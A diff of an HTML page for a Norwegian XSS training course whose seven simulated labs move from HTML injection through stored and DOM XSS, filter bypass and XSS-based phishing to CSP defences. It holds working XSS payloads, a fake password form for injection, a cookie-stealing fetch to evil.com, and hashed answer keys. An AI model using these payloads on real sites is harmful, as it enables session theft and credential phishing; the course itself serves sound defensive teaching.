@@ -180,8 +180,7 @@ strong{font-weight:600;color:var(--text)}
     <div class="lab-meta"><span class="badge badge-easy">Lett</span><span class="level-badge lb-1" style="margin:0">Nivå 1</span><span class="lab-chev">▶</span></div>
   </div>
   <div class="lab-body">
-    <div class="lab-split">
-      <div class="lab-left">
+    <div class="lab-flow">
         <div class="level-badge lb-1">Nivå 1 — HTML-injeksjon</div>
         <p class="lab-desc">Søkefeltet til BookShop reflekterer input direkte med <code>innerHTML</code>. Det betyr at HTML-tagger tolkes. Forstå hva dette innebærer før du går videre til XSS.</p>
         <div>
@@ -191,28 +190,7 @@ strong{font-weight:600;color:var(--text)}
           <div class="obj-item"><div class="obj-num">3</div><div class="obj-text">Injiser <code>&lt;img src=x&gt;</code> — lastes bildet?</div></div>
           <div class="obj-item"><div class="obj-num">4</div><div class="obj-text">Forklar: er HTML-injeksjon alene farlig?</div></div>
         </div>
-        <div class="ans-block">
-          <div class="obj-title">Svar</div>
-          <div class="ans-row" data-a="1155099638">
-            <span class="ans-q">Hvilken JavaScript-egenskap gjør at taggene dine blir tolket som HTML?</span>
-            <input class="ans-in" placeholder="egenskap"><span class="ans-mark"></span>
-          </div>
-          <div class="ans-row" data-a="1815841804">
-            <span class="ans-q">Hvilket attributt brukes i neste lab for å kjøre JS når et bilde feiler?</span>
-            <input class="ans-in" placeholder="attributt"><span class="ans-mark"></span>
-          </div>
-        </div>
-
-        <div>
-          <button class="hint-btn" onclick="toggleHint(this)">▶ Hint</button>
-          <div class="hint-box">Nettleseren tolker alt som HTML via <code>innerHTML</code>. Du kan formatere tekst — men for å kjøre JavaScript trenger du et script eller en event handler.</div>
-          <button class="sol-btn" onclick="toggleSolution(this)">▶ Vis løsning</button>
-          <div class="sol-box"><strong>HTML-injeksjon</strong> viser at nettleseren aksepterer tagger. Ikke direkte farlig alene, men bevis på at <code>innerHTML</code> brukes — neste steg er å legge til JavaScript via event handlers.<br><br>Neste lab: <code>onerror</code>-attributtet kjører JS når et bilde feiler å laste.</div>
-        </div>
-        <div id="done-xss-1" class="complete-banner"><span>✓</span> Lab 1 fullført!</div>
-      </div>
-      <div class="lab-right">
-        <div class="fake-browser">
+        <div class="term-block"><div class="fake-browser">
           <div class="fake-bar">
             <div class="fake-dots"><div class="fdot fdot-r"></div><div class="fdot fdot-y"></div><div class="fdot fdot-g"></div></div>
             <div class="fake-url"><span class="scheme">http://</span>bookshop.no/search?q=<span id="l1-url"></span></div>
@@ -243,9 +221,26 @@ strong{font-weight:600;color:var(--text)}
               </div>
             </div>
           </div>
+        </div></div><div class="ans-block">
+          <div class="obj-title">Svar</div>
+          <div class="ans-row" data-a="1155099638">
+            <span class="ans-q">Hvilken JavaScript-egenskap gjør at taggene dine blir tolket som HTML?</span>
+            <input class="ans-in" placeholder="egenskap"><span class="ans-mark"></span>
+          </div>
+          <div class="ans-row" data-a="1815841804">
+            <span class="ans-q">Hvilket attributt brukes i neste lab for å kjøre JS når et bilde feiler?</span>
+            <input class="ans-in" placeholder="attributt"><span class="ans-mark"></span>
+          </div>
         </div>
+
+        <div>
+          <button class="hint-btn" onclick="toggleHint(this)">▶ Hint</button>
+          <div class="hint-box">Nettleseren tolker alt som HTML via <code>innerHTML</code>. Du kan formatere tekst — men for å kjøre JavaScript trenger du et script eller en event handler.</div>
+          <button class="sol-btn" onclick="toggleSolution(this)">▶ Vis løsning</button>
+          <div class="sol-box"><strong>HTML-injeksjon</strong> viser at nettleseren aksepterer tagger. Ikke direkte farlig alene, men bevis på at <code>innerHTML</code> brukes — neste steg er å legge til JavaScript via event handlers.<br><br>Neste lab: <code>onerror</code>-attributtet kjører JS når et bilde feiler å laste.</div>
+        </div>
+        <div id="done-xss-1" class="complete-banner"><span>✓</span> Lab 1 fullført!</div>
       </div>
-    </div>
   </div>
 </div>
 
@@ -259,8 +254,7 @@ strong{font-weight:600;color:var(--text)}
     <div class="lab-meta"><span class="badge badge-easy">Lett</span><span class="level-badge lb-2" style="margin:0">Nivå 2</span><span class="lab-chev">▶</span></div>
   </div>
   <div class="lab-body">
-    <div class="lab-split">
-      <div class="lab-left">
+    <div class="lab-flow">
         <div class="level-badge lb-2">Nivå 2 — Reflected XSS</div>
         <p class="lab-desc">NewsPortal reflekterer søkeinput med <code>innerHTML</code>. Nå er målet å faktisk kjøre JavaScript — ikke bare injisere HTML.</p>
         <div>
@@ -270,28 +264,7 @@ strong{font-weight:600;color:var(--text)}
           <div class="obj-item"><div class="obj-num">3</div><div class="obj-text">Prøv å lese <code>document.cookie</code> i payloaden</div></div>
           <div class="obj-item"><div class="obj-num">4</div><div class="obj-text">Forklar: hva ville en ekte angriper gjort videre?</div></div>
         </div>
-        <div class="ans-block">
-          <div class="obj-title">Svar</div>
-          <div class="ans-row" data-a="1815841804">
-            <span class="ans-q">Hvilket attributt i payloaden kjører JavaScript?</span>
-            <input class="ans-in" placeholder="attributt"><span class="ans-mark"></span>
-          </div>
-          <div class="ans-row" data-a="1657655276,-152760801">
-            <span class="ans-q">Hvilket objekt leser en angriper for å stjele sesjonen?</span>
-            <input class="ans-in" placeholder="JS-uttrykk"><span class="ans-mark"></span>
-          </div>
-        </div>
-
-        <div>
-          <button class="hint-btn" onclick="toggleHint(this)">▶ Hint</button>
-          <div class="hint-box">Prøv: <code>&lt;img src=x onerror="document.getElementById('l2-cookie').style.display='block'"&gt;</code><br><br><code>onerror</code> kjøres av nettleseren automatisk når bildet feiler å laste. <code>src=x</code> er en ugyldig URL som alltid feiler.</div>
-          <button class="sol-btn" onclick="toggleSolution(this)">▶ Vis løsning</button>
-          <div class="sol-box"><strong>Payload:</strong> <code>&lt;img src=x onerror="document.getElementById('l2-cookie').style.display='block'"&gt;</code><br><br>En ekte angriper ville brukt: <code>onerror="fetch('https://evil.com/?c='+document.cookie)"</code> — sender session-cookien til angripers server i bakgrunnen, usynlig for brukeren.</div>
-        </div>
-        <div id="done-xss-2" class="complete-banner"><span>✓</span> Lab 2 fullført!</div>
-      </div>
-      <div class="lab-right">
-        <div class="fake-browser">
+        <div class="term-block"><div class="fake-browser">
           <div class="fake-bar">
             <div class="fake-dots"><div class="fdot fdot-r"></div><div class="fdot fdot-y"></div><div class="fdot fdot-g"></div></div>
             <div class="fake-url"><span class="scheme">http://</span>newsportal.no/search?q=<span id="l2-url"></span></div>
@@ -326,9 +299,26 @@ strong{font-weight:600;color:var(--text)}
               </div>
             </div>
           </div>
+        </div></div><div class="ans-block">
+          <div class="obj-title">Svar</div>
+          <div class="ans-row" data-a="1815841804">
+            <span class="ans-q">Hvilket attributt i payloaden kjører JavaScript?</span>
+            <input class="ans-in" placeholder="attributt"><span class="ans-mark"></span>
+          </div>
+          <div class="ans-row" data-a="1657655276,-152760801">
+            <span class="ans-q">Hvilket objekt leser en angriper for å stjele sesjonen?</span>
+            <input class="ans-in" placeholder="JS-uttrykk"><span class="ans-mark"></span>
+          </div>
         </div>
+
+        <div>
+          <button class="hint-btn" onclick="toggleHint(this)">▶ Hint</button>
+          <div class="hint-box">Prøv: <code>&lt;img src=x onerror="document.getElementById('l2-cookie').style.display='block'"&gt;</code><br><br><code>onerror</code> kjøres av nettleseren automatisk når bildet feiler å laste. <code>src=x</code> er en ugyldig URL som alltid feiler.</div>
+          <button class="sol-btn" onclick="toggleSolution(this)">▶ Vis løsning</button>
+          <div class="sol-box"><strong>Payload:</strong> <code>&lt;img src=x onerror="document.getElementById('l2-cookie').style.display='block'"&gt;</code><br><br>En ekte angriper ville brukt: <code>onerror="fetch('https://evil.com/?c='+document.cookie)"</code> — sender session-cookien til angripers server i bakgrunnen, usynlig for brukeren.</div>
+        </div>
+        <div id="done-xss-2" class="complete-banner"><span>✓</span> Lab 2 fullført!</div>
       </div>
-    </div>
   </div>
 </div>
 
@@ -342,8 +332,7 @@ strong{font-weight:600;color:var(--text)}
     <div class="lab-meta"><span class="badge badge-medium">Middels</span><span class="level-badge lb-3" style="margin:0">Nivå 3</span><span class="lab-chev">▶</span></div>
   </div>
   <div class="lab-body">
-    <div class="lab-split">
-      <div class="lab-left">
+    <div class="lab-flow">
         <div class="level-badge lb-3">Nivå 3 — Stored XSS</div>
         <p class="lab-desc">TechForum lagrer kommentarer og viser dem til alle. En payload her kjøres for <em>alle besøkende</em> — ikke bare deg.</p>
         <div>
@@ -353,28 +342,7 @@ strong{font-weight:600;color:var(--text)}
           <div class="obj-item"><div class="obj-num">3</div><div class="obj-text">Åpne siden som en annen bruker — kjøres payloaden automatisk?</div></div>
           <div class="obj-item"><div class="obj-num">4</div><div class="obj-text">Forklar hvorfor stored XSS er farligere enn reflected</div></div>
         </div>
-        <div class="ans-block">
-          <div class="obj-title">Svar</div>
-          <div class="ans-row" data-a="479342582,182574852,2039010516">
-            <span class="ans-q">Hvilken type XSS rammer alle besøkende automatisk?</span>
-            <input class="ans-in" placeholder="ett ord"><span class="ans-mark"></span>
-          </div>
-          <div class="ans-row" data-a="1769641445">
-            <span class="ans-q">Hvilken egenskap bør brukes ved visning i stedet for innerHTML?</span>
-            <input class="ans-in" placeholder="egenskap"><span class="ans-mark"></span>
-          </div>
-        </div>
-
-        <div>
-          <button class="hint-btn" onclick="toggleHint(this)">▶ Hint</button>
-          <div class="hint-box">Prøv en payload i kommentarfeltet: <code>&lt;img src=x onerror="this.closest('.ts-comment').style.outline='3px solid red'"&gt;</code><br><br>Deretter klikk "Simuer ny besøkende" — scriptet kjøres på nytt automatisk.</div>
-          <button class="sol-btn" onclick="toggleSolution(this)">▶ Vis løsning</button>
-          <div class="sol-box"><strong>Stored XSS er verre</strong> fordi payloaden kjøres for <em>alle</em> som besøker siden — inkludert admins. En admin som besøker siden med payloaden kan miste sin session.<br><br>Fix: sanitér innput <em>server-side</em> før lagring i database, og bruk <code>textContent</code> ved visning.</div>
-        </div>
-        <div id="done-xss-3" class="complete-banner"><span>✓</span> Lab 3 fullført!</div>
-      </div>
-      <div class="lab-right">
-        <div class="fake-browser">
+        <div class="term-block"><div class="fake-browser">
           <div class="fake-bar">
             <div class="fake-dots"><div class="fdot fdot-r"></div><div class="fdot fdot-y"></div><div class="fdot fdot-g"></div></div>
             <div class="fake-url"><span class="scheme">https://</span>techforum.no/thread/42</div>
@@ -409,9 +377,26 @@ strong{font-weight:600;color:var(--text)}
               </div>
             </div>
           </div>
+        </div></div><div class="ans-block">
+          <div class="obj-title">Svar</div>
+          <div class="ans-row" data-a="479342582,182574852,2039010516">
+            <span class="ans-q">Hvilken type XSS rammer alle besøkende automatisk?</span>
+            <input class="ans-in" placeholder="ett ord"><span class="ans-mark"></span>
+          </div>
+          <div class="ans-row" data-a="1769641445">
+            <span class="ans-q">Hvilken egenskap bør brukes ved visning i stedet for innerHTML?</span>
+            <input class="ans-in" placeholder="egenskap"><span class="ans-mark"></span>
+          </div>
         </div>
+
+        <div>
+          <button class="hint-btn" onclick="toggleHint(this)">▶ Hint</button>
+          <div class="hint-box">Prøv en payload i kommentarfeltet: <code>&lt;img src=x onerror="this.closest('.ts-comment').style.outline='3px solid red'"&gt;</code><br><br>Deretter klikk "Simuer ny besøkende" — scriptet kjøres på nytt automatisk.</div>
+          <button class="sol-btn" onclick="toggleSolution(this)">▶ Vis løsning</button>
+          <div class="sol-box"><strong>Stored XSS er verre</strong> fordi payloaden kjøres for <em>alle</em> som besøker siden — inkludert admins. En admin som besøker siden med payloaden kan miste sin session.<br><br>Fix: sanitér innput <em>server-side</em> før lagring i database, og bruk <code>textContent</code> ved visning.</div>
+        </div>
+        <div id="done-xss-3" class="complete-banner"><span>✓</span> Lab 3 fullført!</div>
       </div>
-    </div>
   </div>
 </div>
 
@@ -425,8 +410,7 @@ strong{font-weight:600;color:var(--text)}
     <div class="lab-meta"><span class="badge badge-medium">Middels</span><span class="level-badge lb-3" style="margin:0">Nivå 4</span><span class="lab-chev">▶</span></div>
   </div>
   <div class="lab-body">
-    <div class="lab-split">
-      <div class="lab-left">
+    <div class="lab-flow">
         <div class="level-badge lb-3">Nivå 4 — DOM-basert XSS</div>
         <p class="lab-desc">ShopNow leser brukernavnet fra URL-parameteren <code>?name=</code> og setter det inn med <code>innerHTML</code> — uten å sende noe til serveren.</p>
         <div>
@@ -436,28 +420,7 @@ strong{font-weight:600;color:var(--text)}
           <div class="obj-item"><div class="obj-num">3</div><div class="obj-text">Forklar: hvorfor ser aldri serveren denne payloaden?</div></div>
           <div class="obj-item"><div class="obj-num">4</div><div class="obj-text">Forklar: hvilken forsvarsstrategi virker mot DOM XSS?</div></div>
         </div>
-        <div class="ans-block">
-          <div class="obj-title">Svar</div>
-          <div class="ans-row" data-a="193508280,633771334,277122859">
-            <span class="ans-q">Hvor kommer brukerinputen fra i DOM-basert XSS?</span>
-            <input class="ans-in" placeholder="ett ord"><span class="ans-mark"></span>
-          </div>
-          <div class="ans-row" data-a="1769641445">
-            <span class="ans-q">Hvilken egenskap fikser dette uten å fjerne funksjonalitet?</span>
-            <input class="ans-in" placeholder="egenskap"><span class="ans-mark"></span>
-          </div>
-        </div>
-
-        <div>
-          <button class="hint-btn" onclick="toggleHint(this)">▶ Hint</button>
-          <div class="hint-box">URL-fragmentet (<code>#hash</code>) og URL-parametre lest med <code>location.search</code> sendes aldri til serveren — de lever kun i nettleseren. Server-side WAF og filtrering er blindt for dette angrepet.</div>
-          <button class="sol-btn" onclick="toggleSolution(this)">▶ Vis løsning</button>
-          <div class="sol-box"><strong>DOM XSS-fix:</strong> Bruk <code>textContent</code> i stedet for <code>innerHTML</code> når brukerinput fra URL vises.<br><br>Alternativt: encode URL-parametre med <code>encodeURIComponent()</code> og decode med <code>decodeURIComponent()</code> — taggetegn blir da <code>%3C</code> og <code>%3E</code>, som <code>innerHTML</code> ikke tolker som HTML.</div>
-        </div>
-        <div id="done-xss-4" class="complete-banner"><span>✓</span> Lab 4 fullført!</div>
-      </div>
-      <div class="lab-right">
-        <div class="fake-browser">
+        <div class="term-block"><div class="fake-browser">
           <div class="fake-bar">
             <div class="fake-dots"><div class="fdot fdot-r"></div><div class="fdot fdot-y"></div><div class="fdot fdot-g"></div></div>
             <div class="fake-url"><span class="scheme">https://</span>shopnow.no/welcome?name=<span id="l4-urlparam">Ola</span></div>
@@ -491,9 +454,26 @@ strong{font-weight:600;color:var(--text)}
               </div>
             </div>
           </div>
+        </div></div><div class="ans-block">
+          <div class="obj-title">Svar</div>
+          <div class="ans-row" data-a="193508280,633771334,277122859">
+            <span class="ans-q">Hvor kommer brukerinputen fra i DOM-basert XSS?</span>
+            <input class="ans-in" placeholder="ett ord"><span class="ans-mark"></span>
+          </div>
+          <div class="ans-row" data-a="1769641445">
+            <span class="ans-q">Hvilken egenskap fikser dette uten å fjerne funksjonalitet?</span>
+            <input class="ans-in" placeholder="egenskap"><span class="ans-mark"></span>
+          </div>
         </div>
+
+        <div>
+          <button class="hint-btn" onclick="toggleHint(this)">▶ Hint</button>
+          <div class="hint-box">URL-fragmentet (<code>#hash</code>) og URL-parametre lest med <code>location.search</code> sendes aldri til serveren — de lever kun i nettleseren. Server-side WAF og filtrering er blindt for dette angrepet.</div>
+          <button class="sol-btn" onclick="toggleSolution(this)">▶ Vis løsning</button>
+          <div class="sol-box"><strong>DOM XSS-fix:</strong> Bruk <code>textContent</code> i stedet for <code>innerHTML</code> når brukerinput fra URL vises.<br><br>Alternativt: encode URL-parametre med <code>encodeURIComponent()</code> og decode med <code>decodeURIComponent()</code> — taggetegn blir da <code>%3C</code> og <code>%3E</code>, som <code>innerHTML</code> ikke tolker som HTML.</div>
+        </div>
+        <div id="done-xss-4" class="complete-banner"><span>✓</span> Lab 4 fullført!</div>
       </div>
-    </div>
   </div>
 </div>
 
@@ -507,8 +487,7 @@ strong{font-weight:600;color:var(--text)}
     <div class="lab-meta"><span class="badge badge-hard">Hard</span><span class="level-badge lb-4" style="margin:0">Nivå 5</span><span class="lab-chev">▶</span></div>
   </div>
   <div class="lab-body">
-    <div class="lab-split">
-      <div class="lab-left">
+    <div class="lab-flow">
         <div class="level-badge lb-4">Nivå 5 — Filter bypass</div>
         <p class="lab-desc">ContactForm prøver å blokkere XSS ved å fjerne <code>&lt;script&gt;</code>-tagger. Men dette filteret er enkelt å omgå. Finn minst to metoder.</p>
         <div>
@@ -518,28 +497,7 @@ strong{font-weight:600;color:var(--text)}
           <div class="obj-item"><div class="obj-num">3</div><div class="obj-text">Bypass med uppercase: <code>&lt;SCRIPT&gt;</code></div></div>
           <div class="obj-item"><div class="obj-num">4</div><div class="obj-text">Forklar hvorfor blacklist-filtrering alltid vil feile</div></div>
         </div>
-        <div class="ans-block">
-          <div class="obj-title">Svar</div>
-          <div class="ans-row" data-a="-1152543902">
-            <span class="ans-q">Blacklist eller whitelist — hvilken tilnærming er riktig?</span>
-            <input class="ans-in" placeholder="ett ord"><span class="ans-mark"></span>
-          </div>
-          <div class="ans-row" data-a="-1214831708">
-            <span class="ans-q">Hvilket bibliotek anbefales i løsningen?</span>
-            <input class="ans-in" placeholder="biblioteknavn"><span class="ans-mark"></span>
-          </div>
-        </div>
-
-        <div>
-          <button class="hint-btn" onclick="toggleHint(this)">▶ Hint</button>
-          <div class="hint-box">Det finnes hundrevis av gyldige XSS-vektorer uten <code>&lt;script&gt;</code>:<br>• <code>&lt;img onerror=...&gt;</code><br>• <code>&lt;svg onload=...&gt;</code><br>• <code>&lt;SCRIPT&gt;</code> (case sensitivity)<br>• <code>&lt;scr&lt;script&gt;ipt&gt;</code> (dobbel-injeksjon hvis filter bare kjøres én gang)</div>
-          <button class="sol-btn" onclick="toggleSolution(this)">▶ Vis løsning</button>
-          <div class="sol-box"><strong>Løsning:</strong> Blacklists er alltid ufullstendige. HTML har over 100 elementer og hundrevis av event handlers som kan kjøre JS.<br><br><strong>Riktig tilnærming:</strong> Whitelist — tillat kun kjente trygge tagger (f.eks. <code>&lt;b&gt;</code>, <code>&lt;i&gt;</code>) med et bibliotek som DOMPurify. Alt annet strippes.</div>
-        </div>
-        <div id="done-xss-5" class="complete-banner"><span>✓</span> Lab 5 fullført!</div>
-      </div>
-      <div class="lab-right">
-        <div class="fake-browser">
+        <div class="term-block"><div class="fake-browser">
           <div class="fake-bar">
             <div class="fake-dots"><div class="fdot fdot-r"></div><div class="fdot fdot-y"></div><div class="fdot fdot-g"></div></div>
             <div class="fake-url"><span class="scheme">https://</span>contactform.no/contact</div>
@@ -574,9 +532,26 @@ strong{font-weight:600;color:var(--text)}
               </div>
             </div>
           </div>
+        </div></div><div class="ans-block">
+          <div class="obj-title">Svar</div>
+          <div class="ans-row" data-a="-1152543902">
+            <span class="ans-q">Blacklist eller whitelist — hvilken tilnærming er riktig?</span>
+            <input class="ans-in" placeholder="ett ord"><span class="ans-mark"></span>
+          </div>
+          <div class="ans-row" data-a="-1214831708">
+            <span class="ans-q">Hvilket bibliotek anbefales i løsningen?</span>
+            <input class="ans-in" placeholder="biblioteknavn"><span class="ans-mark"></span>
+          </div>
         </div>
+
+        <div>
+          <button class="hint-btn" onclick="toggleHint(this)">▶ Hint</button>
+          <div class="hint-box">Det finnes hundrevis av gyldige XSS-vektorer uten <code>&lt;script&gt;</code>:<br>• <code>&lt;img onerror=...&gt;</code><br>• <code>&lt;svg onload=...&gt;</code><br>• <code>&lt;SCRIPT&gt;</code> (case sensitivity)<br>• <code>&lt;scr&lt;script&gt;ipt&gt;</code> (dobbel-injeksjon hvis filter bare kjøres én gang)</div>
+          <button class="sol-btn" onclick="toggleSolution(this)">▶ Vis løsning</button>
+          <div class="sol-box"><strong>Løsning:</strong> Blacklists er alltid ufullstendige. HTML har over 100 elementer og hundrevis av event handlers som kan kjøre JS.<br><br><strong>Riktig tilnærming:</strong> Whitelist — tillat kun kjente trygge tagger (f.eks. <code>&lt;b&gt;</code>, <code>&lt;i&gt;</code>) med et bibliotek som DOMPurify. Alt annet strippes.</div>
+        </div>
+        <div id="done-xss-5" class="complete-banner"><span>✓</span> Lab 5 fullført!</div>
       </div>
-    </div>
   </div>
 </div>
 
@@ -590,8 +565,7 @@ strong{font-weight:600;color:var(--text)}
     <div class="lab-meta"><span class="badge badge-hard">Hard</span><span class="level-badge lb-4" style="margin:0">Nivå 6</span><span class="lab-chev">▶</span></div>
   </div>
   <div class="lab-body">
-    <div class="lab-split">
-      <div class="lab-left">
+    <div class="lab-flow">
         <div class="level-badge lb-4">Nivå 6 — XSS som phishing-vektor</div>
         <p class="lab-desc">BankApp har en XSS-sårbarhet i velkomstmeldingen. En angriper kan injisere et falskt innloggingsskjema — <em>på ekte domene</em> — som stjeler passord.</p>
         <div>
@@ -601,28 +575,7 @@ strong{font-weight:600;color:var(--text)}
           <div class="obj-item"><div class="obj-num">3</div><div class="obj-text">Forklar: hvorfor er dette farligere enn vanlig phishing på annet domene?</div></div>
           <div class="obj-item"><div class="obj-num">4</div><div class="obj-text">Hva beskytter mot dette? (HttpOnly er ikke nok her — hvorfor?)</div></div>
         </div>
-        <div class="ans-block">
-          <div class="obj-title">Svar</div>
-          <div class="ans-row" data-a="193508280,555058584,277122859,542746929">
-            <span class="ans-q">Hvorfor merker ikke brukeren noe galt? Hva er ekte her?</span>
-            <input class="ans-in" placeholder="ett ord"><span class="ans-mark"></span>
-          </div>
-          <div class="ans-row" data-a="193500225">
-            <span class="ans-q">Hjelper HttpOnly mot dette angrepet? ja eller nei</span>
-            <input class="ans-in" placeholder="ja / nei"><span class="ans-mark"></span>
-          </div>
-        </div>
-
-        <div>
-          <button class="hint-btn" onclick="toggleHint(this)">▶ Hint</button>
-          <div class="hint-box">Prøv å injisere et falskt skjema:<br><code>&lt;div style="background:white;padding:20px;border:2px solid red"&gt;&lt;h3&gt;Sikkerhetskontroll&lt;/h3&gt;&lt;input placeholder="Passord"&gt;&lt;/div&gt;</code></div>
-          <button class="sol-btn" onclick="toggleSolution(this)">▶ Vis løsning</button>
-          <div class="sol-box"><strong>Farligere enn vanlig phishing</strong> fordi URL-en er ekte (<code>bankapp.no</code>). Hengelåsen viser HTTPS. Brukeren ser ingenting mistenkelig.<br><br><strong>HttpOnly hjelper ikke</strong> — angriperen trenger ikke cookies. Han fanger passordet direkte via DOM-manipulasjon.<br><br><strong>Forsvar:</strong> Fix XSS-kilden + CSP som blokkerer inline scripts.</div>
-        </div>
-        <div id="done-xss-6" class="complete-banner"><span>✓</span> Lab 6 fullført!</div>
-      </div>
-      <div class="lab-right">
-        <div class="fake-browser">
+        <div class="term-block"><div class="fake-browser">
           <div class="fake-bar">
             <div class="fake-dots"><div class="fdot fdot-r"></div><div class="fdot fdot-y"></div><div class="fdot fdot-g"></div></div>
             <div class="fake-url" style="color:#28c840"><span class="scheme">🔒 https://</span>bankapp.no/velkommen?msg=<span id="l6-urlparam"></span></div>
@@ -664,9 +617,26 @@ strong{font-weight:600;color:var(--text)}
               </div>
             </div>
           </div>
+        </div></div><div class="ans-block">
+          <div class="obj-title">Svar</div>
+          <div class="ans-row" data-a="193508280,555058584,277122859,542746929">
+            <span class="ans-q">Hvorfor merker ikke brukeren noe galt? Hva er ekte her?</span>
+            <input class="ans-in" placeholder="ett ord"><span class="ans-mark"></span>
+          </div>
+          <div class="ans-row" data-a="193500225">
+            <span class="ans-q">Hjelper HttpOnly mot dette angrepet? ja eller nei</span>
+            <input class="ans-in" placeholder="ja / nei"><span class="ans-mark"></span>
+          </div>
         </div>
+
+        <div>
+          <button class="hint-btn" onclick="toggleHint(this)">▶ Hint</button>
+          <div class="hint-box">Prøv å injisere et falskt skjema:<br><code>&lt;div style="background:white;padding:20px;border:2px solid red"&gt;&lt;h3&gt;Sikkerhetskontroll&lt;/h3&gt;&lt;input placeholder="Passord"&gt;&lt;/div&gt;</code></div>
+          <button class="sol-btn" onclick="toggleSolution(this)">▶ Vis løsning</button>
+          <div class="sol-box"><strong>Farligere enn vanlig phishing</strong> fordi URL-en er ekte (<code>bankapp.no</code>). Hengelåsen viser HTTPS. Brukeren ser ingenting mistenkelig.<br><br><strong>HttpOnly hjelper ikke</strong> — angriperen trenger ikke cookies. Han fanger passordet direkte via DOM-manipulasjon.<br><br><strong>Forsvar:</strong> Fix XSS-kilden + CSP som blokkerer inline scripts.</div>
+        </div>
+        <div id="done-xss-6" class="complete-banner"><span>✓</span> Lab 6 fullført!</div>
       </div>
-    </div>
   </div>
 </div>
 
@@ -680,8 +650,7 @@ strong{font-weight:600;color:var(--text)}
     <div class="lab-meta"><span class="badge badge-hard">Hard</span><span class="level-badge lb-5" style="margin:0">Nivå 7</span><span class="lab-chev">▶</span></div>
   </div>
   <div class="lab-body">
-    <div class="lab-split">
-      <div class="lab-left">
+    <div class="lab-flow">
         <div class="level-badge lb-5">Nivå 7 — Forsvar og CSP</div>
         <p class="lab-desc">PrivacyBlog har to versjoner av kommentarfeltet: sårbart og patchet. Sammenlign dem, og forstå hva Content Security Policy (CSP) gjør på toppen.</p>
         <div>
@@ -691,34 +660,7 @@ strong{font-weight:600;color:var(--text)}
           <div class="obj-item"><div class="obj-num">3</div><div class="obj-text">Forklar: er <code>textContent</code> alene nok, eller trenger vi CSP i tillegg?</div></div>
           <div class="obj-item"><div class="obj-num">4</div><div class="obj-text">Skriv en komplett forsvarsstrategi mot XSS (minst 4 lag)</div></div>
         </div>
-        <div class="ans-block">
-          <div class="obj-title">Svar</div>
-          <div class="ans-row" data-a="193488715,1320079330">
-            <span class="ans-q">Hvilken HTTP-header blokkerer inline scripts?</span>
-            <input class="ans-in" placeholder="forkortelse"><span class="ans-mark"></span>
-          </div>
-          <div class="ans-row" data-a="193500225">
-            <span class="ans-q">Er CSP alene nok til å stoppe XSS? ja eller nei</span>
-            <input class="ans-in" placeholder="ja / nei"><span class="ans-mark"></span>
-          </div>
-        </div>
-
-        <div>
-          <button class="hint-btn" onclick="toggleHint(this)">▶ Hint</button>
-          <div class="hint-box">CSP er en HTTP-header som instruerer nettleseren. <code>script-src 'self'</code> betyr at kun scripts fra samme domene kan kjøre — inline scripts blokkeres selv om XSS-payload injiseres.</div>
-          <button class="sol-btn" onclick="toggleSolution(this)">▶ Vis løsning</button>
-          <div class="sol-box"><strong>Komplett forsvarsstrategi:</strong><br>
-          1. <code>textContent</code> / DOMPurify i frontend<br>
-          2. Server-side sanitering før lagring i database<br>
-          3. Output encoding ved visning (<code>&amp;lt;</code> etc.)<br>
-          4. CSP-header som blokkerer inline scripts<br>
-          5. HttpOnly + Secure + SameSite på session cookies<br>
-          6. Regelmessige pentester og SAST i CI/CD-pipeline</div>
-        </div>
-        <div id="done-xss-7" class="complete-banner"><span>✓</span> Lab 7 fullført!</div>
-      </div>
-      <div class="lab-right">
-        <div class="fake-browser">
+        <div class="term-block"><div class="fake-browser">
           <div class="fake-bar">
             <div class="fake-dots"><div class="fdot fdot-r"></div><div class="fdot fdot-y"></div><div class="fdot fdot-g"></div></div>
             <div class="fake-url"><span class="scheme">https://</span>privacyblog.no/post/1</div>
@@ -751,9 +693,32 @@ strong{font-weight:600;color:var(--text)}
               </div>
             </div>
           </div>
+        </div></div><div class="ans-block">
+          <div class="obj-title">Svar</div>
+          <div class="ans-row" data-a="193488715,1320079330">
+            <span class="ans-q">Hvilken HTTP-header blokkerer inline scripts?</span>
+            <input class="ans-in" placeholder="forkortelse"><span class="ans-mark"></span>
+          </div>
+          <div class="ans-row" data-a="193500225">
+            <span class="ans-q">Er CSP alene nok til å stoppe XSS? ja eller nei</span>
+            <input class="ans-in" placeholder="ja / nei"><span class="ans-mark"></span>
+          </div>
         </div>
+
+        <div>
+          <button class="hint-btn" onclick="toggleHint(this)">▶ Hint</button>
+          <div class="hint-box">CSP er en HTTP-header som instruerer nettleseren. <code>script-src 'self'</code> betyr at kun scripts fra samme domene kan kjøre — inline scripts blokkeres selv om XSS-payload injiseres.</div>
+          <button class="sol-btn" onclick="toggleSolution(this)">▶ Vis løsning</button>
+          <div class="sol-box"><strong>Komplett forsvarsstrategi:</strong><br>
+          1. <code>textContent</code> / DOMPurify i frontend<br>
+          2. Server-side sanitering før lagring i database<br>
+          3. Output encoding ved visning (<code>&amp;lt;</code> etc.)<br>
+          4. CSP-header som blokkerer inline scripts<br>
+          5. HttpOnly + Secure + SameSite på session cookies<br>
+          6. Regelmessige pentester og SAST i CI/CD-pipeline</div>
+        </div>
+        <div id="done-xss-7" class="complete-banner"><span>✓</span> Lab 7 fullført!</div>
       </div>
-    </div>
   </div>
 </div>
 
